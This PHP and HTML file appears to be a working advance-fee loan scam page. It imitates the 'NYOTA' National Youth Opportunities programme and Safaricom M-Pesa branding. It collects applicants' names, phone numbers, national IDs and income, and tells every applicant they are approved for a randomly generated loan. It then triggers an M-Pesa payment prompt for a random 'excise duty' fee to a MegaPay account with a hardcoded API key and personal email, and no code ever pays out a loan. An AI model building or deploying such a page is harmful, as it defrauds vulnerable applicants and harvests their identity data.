<?php
session_start();

/*
|--------------------------------------------------------------------------
| Save application data from apply page into session
|--------------------------------------------------------------------------
*/
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['full_name'])) {
    $_SESSION['full_name'] = trim($_POST['full_name'] ?? '');
    $_SESSION['mpesa_number'] = trim($_POST['mpesa_number'] ?? '');
    $_SESSION['national_id'] = trim($_POST['national_id'] ?? '');
    $_SESSION['opportunity'] = trim($_POST['opportunity'] ?? '');
    $_SESSION['education_level'] = trim($_POST['education_level'] ?? '');
    $_SESSION['employment_status'] = trim($_POST['employment_status'] ?? '');
    $_SESSION['monthly_income'] = trim($_POST['monthly_income'] ?? '');

    // Generate once per application
    $_SESSION['fee'] = random_int(100, 200);
    $_SESSION['loan_amount'] = random_int(10000, 70000);
}

/*
|--------------------------------------------------------------------------
| Fallback session values
|--------------------------------------------------------------------------
*/
$full_name = $_SESSION['full_name'] ?? 'Applicant';
$mpesa_number = $_SESSION['mpesa_number'] ?? '';
$national_id = $_SESSION['national_id'] ?? '';
$opportunity = $_SESSION['opportunity'] ?? '';
$education_level = $_SESSION['education_level'] ?? '';
$employment_status = $_SESSION['employment_status'] ?? '';
$monthly_income = $_SESSION['monthly_income'] ?? '';

$fee = $_SESSION['fee'] ?? random_int(100, 200);
$loanAmount = $_SESSION['loan_amount'] ?? random_int(10000, 70000);
$loanrepayment = (int) round($loanAmount + ($loanAmount * 0.035));
$interest = $loanrepayment - $loanAmount;

/*
|--------------------------------------------------------------------------
| Handle AJAX MegaPay STK request
|--------------------------------------------------------------------------
*/
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'initiate_stk') {
    header('Content-Type: application/json');

    $amount = (int) $fee;
    $msisdn = preg_replace('/\s+/', '', $mpesa_number);
    $reference = 'LOAN-' . date('YmdHis');

    // Convert 07XXXXXXXX to 2547XXXXXXXX
    if (preg_match('/^07\d{8}$/', $msisdn)) {
        $msisdn = '254' . substr($msisdn, 1);
    }

    if (!preg_match('/^254\d{9}$/', $msisdn)) {
        echo json_encode([
            'ok' => false,
            'message' => 'Invalid phone number format. Use 07XXXXXXXX or 2547XXXXXXXX.'
        ]);
        exit;
    }

    /*
    |--------------------------------------------------------------------------
    | MegaPay credentials
    |--------------------------------------------------------------------------
    | Replace with your real credentials
    */


    $apiKey = 'MGPYlWU6lMpS';
    $email  = 'denniskoskey5@gmail.com';

    $payload = [
        'api_key'   => $apiKey,
        'email'     => $email,
        'amount'    => $amount,
        'msisdn'    => $msisdn,
        'reference' => $reference
    ];

    $ch = curl_init('https://megapay.co.ke/backend/v1/initiatestk');

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_TIMEOUT => 60
    ]);

    $response = curl_exec($ch);

    if ($response === false) {
        echo json_encode([
            'ok' => false,
            'message' => 'cURL error: ' . curl_error($ch)
        ]);
        curl_close($ch);
        exit;
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $result = json_decode($response, true);

    if ($httpCode !== 200) {
        echo json_encode([
            'ok' => false,
            'message' => 'HTTP error: ' . $httpCode,
            'raw' => $response
        ]);
        exit;
    }

    if (($result['success'] ?? '') === '200') {
        $_SESSION['transaction_request_id'] = $result['transaction_request_id'] ?? null;
        $_SESSION['reference'] = $reference;
        $_SESSION['amount'] = $amount;
        $_SESSION['msisdn'] = $msisdn;

        echo json_encode([
            'ok' => true,
            'message' => 'STK prompt sent successfully.',
            'transaction_request_id' => $result['transaction_request_id'] ?? null
        ]);
        exit;
    }

    echo json_encode([
        'ok' => false,
        'message' => $result['massage'] ?? 'Payment request failed.',
        'raw' => $result
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loan Offer</title>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const withdrawBtn = document.getElementById('withdraw-btn');
      const offerPage = document.getElementById('offer-page');
      const paymentPage = document.getElementById('payment-page');
      const stkPage = document.getElementById('stk-page');
      const backBtn = document.getElementById('back-to-offer');
      const promptCard = document.getElementById('open-stk-page');
      const backToPayment = document.getElementById('back-to-payment');
      const payNowBtn = document.getElementById('pay-now-btn');
      const stkLoaderCard = document.getElementById('stk-loader-card');
      const howCard = document.getElementById('how-it-works-card');
      const stkError = document.getElementById('stk-error');

      if (withdrawBtn) {
        withdrawBtn.addEventListener('click', () => {
          offerPage.style.display = 'none';
          paymentPage.style.display = 'block';
          stkPage.style.display = 'none';
          window.scrollTo({ top: 0, behavior: 'smooth' });
        });
      }

      if (backBtn) {
        backBtn.addEventListener('click', (e) => {
          e.preventDefault();
          paymentPage.style.display = 'none';
          stkPage.style.display = 'none';
          offerPage.style.display = 'block';
          window.scrollTo({ top: 0, behavior: 'smooth' });
        });
      }

      if (promptCard) {
        promptCard.addEventListener('click', () => {
          paymentPage.style.display = 'none';
          stkPage.style.display = 'block';
          window.scrollTo({ top: 0, behavior: 'smooth' });
        });
      }

      if (backToPayment) {
        backToPayment.addEventListener('click', (e) => {
          e.preventDefault();
          stkPage.style.display = 'none';
          paymentPage.style.display = 'block';
          window.scrollTo({ top: 0, behavior: 'smooth' });
        });
      }

      if (payNowBtn) {
        payNowBtn.addEventListener('click', async () => {
          if (howCard) howCard.style.display = 'none';
          if (stkError) {
            stkError.style.display = 'none';
            stkError.textContent = '';
          }

          payNowBtn.style.display = 'none';
          stkLoaderCard.style.display = 'block';

          try {
            const response = await fetch(window.location.href, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
              },
              body: new URLSearchParams({
                action: 'initiate_stk'
              })
            });

            const result = await response.json();

            if (!result.ok) {
              throw new Error(result.message || 'Failed to send prompt.');
            }

            setTimeout(() => {
              stkLoaderCard.style.display = 'none';
              if (howCard) howCard.style.display = 'block';
              payNowBtn.style.display = 'inline-flex';
              alert('STK prompt sent successfully. Please check your phone.');
            }, 10000);

          } catch (error) {
            stkLoaderCard.style.display = 'none';
            if (howCard) howCard.style.display = 'block';
            payNowBtn.style.display = 'inline-flex';

            if (stkError) {
              stkError.textContent = error.message;
              stkError.style.display = 'block';
            }
          }
        });
      }
    });
  </script>

  <style>
    :root {
      --green: #4d8b3f;
      --green-dark: #3f7334;
      --text: #14213d;
      --muted: #6b7a96;
      --border: #d9dde3;
      --bg: #f3f4f4;
      --card: #ffffff;
      --warning: #f5a623;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Inter, Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    .offer-hero {
      background: var(--green);
      color: #fff;
      text-align: center;
      padding: 18px 16px 22px;
      border-top: 4px solid #1d4f91;
    }

    .offer-logo {
      width: 66px;
      height: 44px;
      margin: 0 auto 10px;
      background: #fff;
      border-radius: 2px;
      display: grid;
      place-items: center;
      color: #64748b;
      font-size: 0.5rem;
      font-weight: 800;
      line-height: 1.1;
      text-align: center;
      padding: 4px;
    }

    .offer-hero h1 {
      margin: 0;
      font-size: clamp(2rem, 4vw, 3rem);
      line-height: 1.1;
      font-weight: 800;
    }

    .offer-hero p {
      margin: 8px 0 0;
      font-size: 0.9rem;
      color: rgba(255,255,255,0.92);
    }

    .offer-tags {
      margin-top: 10px;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 18px;
      font-size: 0.85rem;
      font-weight: 600;
    }

    .wrap {
      width: min(100% - 32px, 448px);
      margin: 22px auto 26px;
    }

    .card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 18px 16px;
      margin-bottom: 16px;
    }

    .approval-card {
      border-color: var(--green);
      text-align: center;
      padding: 20px 16px 18px;
    }

    .approval-icon {
      width: 42px;
      height: 42px;
      margin: 0 auto 12px;
      border-radius: 999px;
      border: 2px solid var(--green);
      color: var(--green);
      display: grid;
      place-items: center;
      font-size: 1.3rem;
      font-weight: 800;
    }

    .approval-card h2 {
      margin: 0;
      font-size: 1.05rem;
      font-weight: 800;
    }

    .approval-card p {
      margin: 10px auto 0;
      color: var(--text);
      font-size: 0.95rem;
      line-height: 1.5;
      max-width: 360px;
    }

    .approval-card .amount {
      color: var(--green);
      font-weight: 800;
    }

    .approval-card .note {
      font-size: 0.72rem;
      color: var(--muted);
      margin-top: 10px;
    }

    .card h3 {
      margin: 0 0 14px;
      font-size: 1rem;
      font-weight: 800;
    }

    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, minmax(0, 1fr));
      gap: 12px 18px;
    }

    .label {
      font-size: 0.74rem;
      color: var(--muted);
      margin-bottom: 2px;
    }

    .value {
      font-size: 0.92rem;
      color: var(--text);
      font-weight: 600;
    }

    .value.amount {
      color: var(--green);
      font-weight: 800;
    }

    .offer-table {
      display: grid;
      gap: 0;
    }

    .offer-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      padding: 10px 0;
      border-top: 1px solid #e6e8eb;
      font-size: 0.92rem;
    }

    .offer-row:first-child {
      border-top: 0;
      padding-top: 0;
    }

    .offer-row:last-child {
      padding-bottom: 0;
    }

    .offer-right {
      text-align: right;
      font-weight: 700;
      color: var(--text);
    }

    .offer-right strong {
      font-size: 1rem;
      font-weight: 800;
    }

    .badge {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 2px 8px;
      border-radius: 999px;
      background: var(--green);
      color: #fff;
      font-size: 0.68rem;
      font-weight: 700;
      margin-top: 4px;
    }

    .withdraw-card {
      border: 1px solid var(--warning);
      padding: 14px 12px;
    }

    .withdraw-btn {
      width: 100%;
      min-height: 36px;
      border: 0;
      border-radius: 4px;
      background: var(--green);
      color: #fff;
      font-size: 0.95rem;
      font-weight: 800;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 8px 18px rgba(77, 139, 63, 0.22);
    }

    .withdraw-btn:hover {
      background: var(--green-dark);
    }

    .withdraw-note {
      text-align: center;
      margin-top: 8px;
      font-size: 0.68rem;
      color: var(--muted);
    }

    .payment-page,
    .stk-page {
      min-height: 100vh;
      background: var(--bg);
    }

    .payment-hero {
      background: #08b04f;
      color: #fff;
      text-align: center;
      padding: 20px 16px 28px;
    }

    .mpesa-brand {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 14px;
    }

    .mpesa-badge {
      width: 56px;
      height: 56px;
      border-radius: 999px;
      background: #f4f5f4;
      color: #08b04f;
      display: grid;
      place-items: center;
      font-size: 1.9rem;
      font-weight: 800;
    }

    .mpesa-copy {
      text-align: left;
      line-height: 1;
    }

    .mpesa-copy strong {
      display: block;
      font-size: 1.1rem;
      font-weight: 800;
      letter-spacing: 0.01em;
    }

    .mpesa-copy span {
      display: block;
      margin-top: 4px;
      font-size: 0.62rem;
      letter-spacing: 0.08em;
      opacity: 0.9;
    }

    .payment-hero h2 {
      margin: 0;
      font-size: 1.35rem;
      font-weight: 800;
    }

    .payment-hero p {
      margin: 8px 0 0;
      font-size: 0.92rem;
      color: rgba(255,255,255,0.96);
    }

    .payment-wrap {
      width: min(100% - 32px, 420px);
      margin: 22px auto 0;
    }

    .amount-card {
      background: linear-gradient(135deg, #08b04f, #4dcc84);
      color: #fff;
      border-radius: 18px;
      padding: 22px 18px;
      text-align: center;
      box-shadow: 0 14px 30px rgba(8, 176, 79, 0.2);
    }

    .amount-card .label {
      color: rgba(255,255,255,0.92);
      font-size: 0.95rem;
      font-weight: 700;
      margin-bottom: 4px;
    }

    .amount-card .value {
      color: #fff;
      font-size: 2.2rem;
      font-weight: 800;
      line-height: 1.1;
    }

    .payment-method-card {
      appearance: none;
      margin-top: 24px;
      background: #fff;
      border: 2px solid #bfe9cf;
      border-radius: 18px;
      padding: 20px 18px;
      display: flex;
      align-items: center;
      gap: 16px;
      box-shadow: 0 8px 22px rgba(15, 23, 42, 0.05);
      cursor: pointer;
      width: 100%;
      text-align: left;
    }

    .payment-icon {
      width: 54px;
      height: 54px;
      border-radius: 14px;
      background: linear-gradient(135deg, #08b04f, #4dcc84);
      color: #fff;
      display: grid;
      place-items: center;
      font-size: 1.4rem;
      flex-shrink: 0;
    }

    .payment-method-copy {
      min-width: 0;
      flex: 1;
    }

    .payment-method-copy strong {
      display: block;
      color: var(--text);
      font-size: 0.98rem;
      font-weight: 800;
    }

    .payment-method-copy span {
      display: block;
      margin-top: 5px;
      color: #08b04f;
      font-size: 0.9rem;
      font-weight: 700;
    }

    .payment-arrow {
      width: 40px;
      height: 40px;
      border-radius: 999px;
      background: #08b04f;
      color: #fff;
      display: grid;
      place-items: center;
      font-size: 1.1rem;
      flex-shrink: 0;
    }

    .payment-back,
    .choose-method {
      display: inline-block;
      margin: 30px auto 0;
      width: 100%;
      text-align: center;
      color: #667085;
      font-size: 0.95rem;
      font-weight: 600;
      text-decoration: none;
    }

    .payment-secured {
      width: fit-content;
      margin: 34px auto 0;
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 10px 16px;
      border-radius: 999px;
      background: #fff;
      border: 1px solid #e5e7eb;
      color: #6b7280;
      font-size: 0.84rem;
      box-shadow: 0 2px 8px rgba(15, 23, 42, 0.03);
    }

    .payment-secured .m {
      width: 24px;
      height: 24px;
      border-radius: 999px;
      background: #08b04f;
      color: #fff;
      display: grid;
      place-items: center;
      font-size: 0.9rem;
      font-weight: 800;
    }

    .stk-wrap {
      width: min(100% - 32px, 360px);
      margin: 18px auto 28px;
    }

    .stk-card {
      background: #fff;
      border: 1px solid #e5e7eb;
      border-radius: 18px;
      padding: 18px 16px;
      box-shadow: 0 8px 22px rgba(15, 23, 42, 0.05);
      margin-top: 14px;
      text-align: center;
    }

    .muted-label {
      color: #6b7280;
      font-size: 0.9rem;
      margin-bottom: 10px;
    }

    .phone-chip {
      width: fit-content;
      margin: 0 auto;
      padding: 12px 20px;
      border-radius: 12px;
      background: #c9e6cd;
      color: #08b04f;
      text-align: center;
      min-width: 178px;
    }

    .phone-chip strong {
      font-size: 0.98rem;
      font-weight: 800;
    }

    .phone-chip small {
      display: block;
      margin-top: 4px;
      color: #4fbf76;
      font-size: 0.78rem;
      font-weight: 600;
    }

    .how-card {
      background: #fff;
      border: 1px solid #e5e7eb;
      border-radius: 18px;
      overflow: hidden;
      margin-top: 16px;
      box-shadow: 0 8px 22px rgba(15, 23, 42, 0.05);
    }

    .how-header {
      background: #dcebdd;
      color: #08b04f;
      text-align: center;
      font-size: 0.98rem;
      font-weight: 800;
      padding: 12px 16px;
    }

    .how-body {
      padding: 14px 12px;
      display: grid;
      gap: 10px;
    }

    .how-step {
      background: #f8faf8;
      border: 1px solid #eef2ef;
      border-radius: 12px;
      padding: 10px 12px;
      display: flex;
      gap: 12px;
      align-items: flex-start;
    }

    .step-num {
      width: 28px;
      height: 28px;
      border-radius: 999px;
      background: #08b04f;
      color: #fff;
      display: grid;
      place-items: center;
      font-size: 0.84rem;
      font-weight: 800;
      flex-shrink: 0;
    }

    .how-step strong {
      display: block;
      color: var(--text);
      font-size: 0.95rem;
      margin-bottom: 2px;
    }

    .how-step span {
      color: var(--muted);
      font-size: 0.85rem;
    }

    .pay-btn {
      width: 100%;
      min-height: 44px;
      border: 0;
      border-radius: 12px;
      background: #08b04f;
      color: #fff;
      font-size: 1rem;
      font-weight: 800;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      cursor: pointer;
      margin-top: 14px;
      box-shadow: 0 12px 24px rgba(8,176,79,0.22);
    }

    .pay-btn:hover {
      background: #079846;
    }

    .stk-loader-card {
      display: none;
      background: #fff;
      border: 1px solid #e5e7eb;
      border-radius: 18px;
      padding: 24px 18px;
      text-align: center;
      margin-top: 16px;
      box-shadow: 0 8px 22px rgba(15, 23, 42, 0.05);
    }

    .spinner-ring {
      width: 34px;
      height: 34px;
      margin: 0 auto 16px;
      border-radius: 999px;
      border: 4px solid #d7f0df;
      border-top-color: #08b04f;
      animation: spin 0.9s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .stk-loader-card strong {
      display: block;
      font-size: 1rem;
      margin-bottom: 8px;
      color: var(--text);
    }

    .stk-loader-card span {
      color: var(--muted);
      font-size: 0.9rem;
    }

    .stk-error {
      display: none;
      margin-top: 12px;
      color: #b42318;
      font-size: 0.9rem;
      text-align: center;
    }

    @media (max-width: 520px) {
      .wrap,
      .payment-wrap,
      .stk-wrap {
        width: min(100% - 16px, 448px);
      }

      .offer-hero {
        padding: 16px 12px 20px;
      }

      .card {
        padding: 16px 14px;
      }

      .info-grid {
        grid-template-columns: 1fr;
      }

      .offer-row {
        font-size: 0.88rem;
      }
    }
  </style>
</head>
<body>
  <div id="offer-page">
    <section class="offer-hero">
      <div class="offer-logo">NYOTA<br>LIMIT BOOST</div>
      <h1>Your Loan Offer</h1>
      <p>National Youth Opportunities</p>
      <div class="offer-tags">
        <span>⚡ Fast</span>
        <span>🛡 Secure</span>
        <span>☆ Youth Empowerment</span>
      </div>
    </section>

    <main class="wrap">
      <section class="card approval-card">
        <div class="approval-icon">✓</div>
        <h2>Congratulations, <?php echo htmlspecialchars($full_name); ?>!</h2>
        <p>
          You have qualified for a loan of <span class="amount">Ksh <?php echo number_format($loanAmount); ?></span> to your M-PESA.
        </p>
        <p class="note">
          Your total repayment will be Ksh <?php echo number_format($loanrepayment); ?>, with a low interest rate of 3.5%, and an excise duty of Ksh <?php echo number_format($fee); ?>.<br>
          Terms and conditions apply.
        </p>
      </section>

      <section class="card">
        <h3>Applicant Information</h3>
        <div class="info-grid">
          <div>
            <div class="label">Full Names</div>
            <div class="value"><?php echo htmlspecialchars($full_name); ?></div>
          </div>
          <div>
            <div class="label">M-Pesa Number</div>
            <div class="value"><?php echo htmlspecialchars($mpesa_number); ?></div>
          </div>
          <div>
            <div class="label">Phone Number</div>
            <div class="value"><?php echo htmlspecialchars($mpesa_number); ?></div>
          </div>
          <div>
            <div class="label">Eligible Loan Amount</div>
            <div class="value amount">Ksh <?php echo number_format($loanAmount); ?></div>
          </div>
        </div>
      </section>

      <section class="card">
        <h3>Your Loan Offer</h3>
        <div class="offer-table">
          <div class="offer-row">
            <div>Loan Amount</div>
            <div class="offer-right">
              <strong>Ksh <?php echo number_format($loanAmount); ?></strong><br>
              <span class="badge">Approved</span>
            </div>
          </div>
          <div class="offer-row">
            <div>Interest Rate</div>
            <div class="offer-right">3.5%</div>
          </div>
          <div class="offer-row">
            <div>Interest Amount</div>
            <div class="offer-right">Ksh <?php echo number_format($interest); ?></div>
          </div>
          <div class="offer-row">
            <div>Total Repayable</div>
            <div class="offer-right"><strong>Ksh <?php echo number_format($loanrepayment); ?></strong></div>
          </div>
        </div>
      </section>

      <section class="card withdraw-card">
        <button class="withdraw-btn" id="withdraw-btn">
          Withdraw - Ksh <?php echo number_format($loanAmount); ?> <span>→</span>
        </button>
        <div class="withdraw-note">Secure payment via M-Pesa</div>
      </section>
    </main>
  </div>

  <div id="payment-page" class="payment-page" style="display:none;">
    <section class="payment-hero">
      <div class="mpesa-brand">
        <div class="mpesa-badge">M</div>
        <div class="mpesa-copy">
          <strong>M-PESA</strong>
          <span>HAKUNA MATATA</span>
        </div>
      </div>
      <h2>Choose Payment Method</h2>
      <p>Select how you'd like to pay</p>
    </section>

    <main class="payment-wrap">
      <section class="amount-card">
        <div class="label">Amount to Pay</div>
        <div class="value">KSh <?php echo number_format($fee); ?></div>
      </section>

      <button type="button" class="payment-method-card" id="open-stk-page">
        <div class="payment-icon">📱</div>
        <div class="payment-method-copy">
          <strong>Receive prompt on your phone</strong>
          <span>Fastest • Auto-verified</span>
        </div>
        <div class="payment-arrow">→</div>
      </button>

      <a href="#" id="back-to-offer" class="payment-back">← Back</a>

      <div class="payment-secured">
        <span class="m">M</span>
        <span>Secured by M-Pesa • Safaricom PLC</span>
      </div>
    </main>
  </div>

  <div id="stk-page" class="stk-page" style="display:none;">
    <section class="payment-hero">
      <div class="mpesa-brand">
        <div class="mpesa-badge">M</div>
        <div class="mpesa-copy">
          <strong>M-PESA</strong>
          <span>HAKUNA MATATA</span>
        </div>
      </div>
      <h2>STK Push Payment</h2>
      <p>Automatic payment prompt</p>
    </section>

    <main class="stk-wrap">
      <section class="amount-card">
        <div class="label">Amount to Pay</div>
        <div class="value">KSh <?php echo number_format($fee); ?></div>
      </section>

      <section class="stk-card">
        <div class="muted-label">Payment will be sent to</div>
        <div class="phone-chip">
          <strong><?php echo htmlspecialchars($mpesa_number); ?></strong>
          <small>Tap to change</small>
        </div>
      </section>

      <section class="how-card" id="how-it-works-card">
        <div class="how-header">📱 How It Works</div>
        <div class="how-body">
          <div class="how-step">
            <div class="step-num">1</div>
            <div><strong>Click 'Pay Now'</strong><span>Start the payment process</span></div>
          </div>
          <div class="how-step">
            <div class="step-num">2</div>
            <div><strong>Check Your Phone</strong><span>You'll receive an M-Pesa prompt</span></div>
          </div>
          <div class="how-step">
            <div class="step-num">3</div>
            <div><strong>Enter M-Pesa PIN</strong><span>Confirm payment with your PIN</span></div>
          </div>
          <div class="how-step">
            <div class="step-num">4</div>
            <div><strong>Done!</strong><span>Payment verified automatically</span></div>
          </div>
        </div>
      </section>

      <div id="stk-loader-card" class="stk-loader-card">
        <div class="spinner-ring"></div>
        <strong>Sending Payment Request...</strong>
        <span>Please wait while we send the payment prompt to your phone</span>
      </div>

      <button class="pay-btn" id="pay-now-btn" type="button">
        Pay Now - KSh <?php echo number_format($fee); ?> <span>→</span>
      </button>

      <div id="stk-error" class="stk-error"></div>

      <a href="#" id="back-to-payment" class="choose-method">← Choose Different Method</a>

      <div class="payment-secured">
        <span class="m">M</span>
        <span>Secured by M-Pesa • Safaricom PLC</span>
      </div>
    </main>
  </div>
</body>
</html>
